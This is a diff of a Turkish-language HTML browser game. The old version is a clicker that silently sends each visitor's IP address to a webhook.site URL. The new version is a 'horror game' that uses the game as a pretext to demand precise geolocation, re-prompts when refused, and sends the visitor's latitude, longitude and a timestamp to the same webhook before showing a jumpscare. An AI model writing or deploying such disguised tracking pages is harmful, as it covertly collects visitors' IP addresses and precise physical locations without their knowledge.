@@ -2,100 +2,148 @@
 <html lang="tr">
 <head>
   <meta charset="UTF-8">
-  <title>Click Hero - Basit Oyun</title>
+  <title>Konum Tabanlı Korku Oyunu</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
-    * {
+    html, body {
       margin: 0;
       padding: 0;
-      box-sizing: border-box;
-    }
-
-    body {
+      background: black;
+      color: white;
       font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(to right, #141e30, #243b55);
-      color: white;
       display: flex;
-      flex-direction: column;
-      align-items: center;
       justify-content: center;
-      min-height: 100vh;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+
+    #permission-screen {
       text-align: center;
-      padding: 20px;
     }
 
-    h1 {
-      font-size: 3rem;
-      margin-bottom: 10px;
+    #game-container {
+      display: none;
+      position: relative;
+      width: 100%;
+      height: 100%;
     }
 
-    p {
-      color: #ccc;
-      margin-bottom: 30px;
-    }
-
-    .game-box {
-      background: rgba(255, 255, 255, 0.1);
-      padding: 30px;
-      border-radius: 20px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.3);
-    }
-
-    #score {
-      font-size: 2.5rem;
-      margin-bottom: 20px;
-    }
-
-    button {
-      padding: 15px 30px;
-      font-size: 1.5rem;
-      border: none;
-      border-radius: 10px;
-      background: #ff5722;
-      color: white;
+    #circle {
+      width: 100px;
+      height: 100px;
+      background: crimson;
+      border-radius: 50%;
+      position: absolute;
       cursor: pointer;
-      transition: background 0.3s ease;
+      box-shadow: 0 0 20px red;
+      transition: all 0.2s ease;
     }
 
-    button:hover {
-      background: #e64a19;
+    #score-display {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      font-size: 1.5rem;
     }
 
-    footer {
-      margin-top: 40px;
-      font-size: 0.9rem;
-      color: #888;
+    #jumpscare {
+      display: none;
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      background: black;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+
+    #jumpscare img {
+      max-width: 100%;
+      height: auto;
+    }
+
+    audio {
+      display: none;
     }
   </style>
 </head>
 <body>
 
-  <h1>Click Hero</h1>
-  <p>Ne kadar hızlı tıklayabilirsin? Deneyelim!</p>
+<div id="permission-screen">
+  <h1>Bu oyunu oynamak için konum izni vermen gerekiyor.</h1>
+  <button onclick="requestLocation()">Konum İzni Ver</button>
+</div>
 
-  <div class="game-box">
-    <div id="score">0</div>
-    <button onclick="increaseScore()">Tıkla!</button>
+<div id="game-container">
+  <div id="score-display">Skor: 0</div>
+  <div id="circle" onclick="handleClick()"></div>
+  <div id="jumpscare">
+    <img src="https://i.imgur.com/jxKX1U7.png" alt="Scream">
+    <audio id="scream" src="https://www.myinstants.com/media/sounds/wilhelm-scream.mp3" autoplay></audio>
   </div>
+</div>
 
-  <footer>© 2025 Click Hero</footer>
-
-  <script>
-    let score = 0;
-    function increaseScore() {
-      score++;
-      document.getElementById('score').innerText = score;
-    }
-
-    // IP Adresini al ve webhook.site'a gönder
-    fetch("https://api64.ipify.org?format=json")
-      .then(response => response.json())
-      .then(data => {
-        const ip = data.ip;
-        const img = new Image();
-        img.src = "https://webhook.site/f5dc1b3e-8719-4c26-bd5e-23fe7a13ba34?ip=" + ip + "&t=" + new Date().toISOString();
+<script>
+  function requestLocation() {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(success, error, {
+        enableHighAccuracy: true
       });
-  </script>
+    } else {
+      alert("Tarayıcın konum desteği vermiyor.");
+    }
+  }
+
+  function success(position) {
+    const lat = position.coords.latitude;
+    const lon = position.coords.longitude;
+    const img = new Image();
+    img.src = "https://webhook.site/f5dc1b3e-8719-4c26-bd5e-23fe7a13ba34?lat=" + lat + "&lon=" + lon + "&t=" + new Date().toISOString();
+
+    document.getElementById("permission-screen").style.display = "none";
+    document.getElementById("game-container").style.display = "block";
+    randomPosition(); // oyun başlasın
+  }
+
+  function error(err) {
+    alert("Konum izni verilmeden oyun başlayamaz.");
+    requestLocation(); // tekrar dener
+  }
+
+  // Oyun fonksiyonları
+  let score = 0;
+  const circle = document.getElementById("circle");
+  const scoreDisplay = document.getElementById("score-display");
+  const jumpscare = document.getElementById("jumpscare");
+  const screamSound = document.getElementById("scream");
+
+  function randomPosition() {
+    const container = document.getElementById("game-container");
+    const maxX = container.clientWidth - circle.offsetWidth;
+    const maxY = container.clientHeight - circle.offsetHeight;
+    const x = Math.random() * maxX;
+    const y = Math.random() * maxY;
+    circle.style.left = x + "px";
+    circle.style.top = y + "px";
+  }
+
+  function handleClick() {
+    score++;
+    scoreDisplay.textContent = "Skor: " + score;
+    randomPosition();
+
+    if (score === 15) {
+      triggerJumpscare();
+    }
+  }
+
+  function triggerJumpscare() {
+    jumpscare.style.display = "flex";
+    screamSound.play();
+  }
+</script>
 
 </body>
 </html>
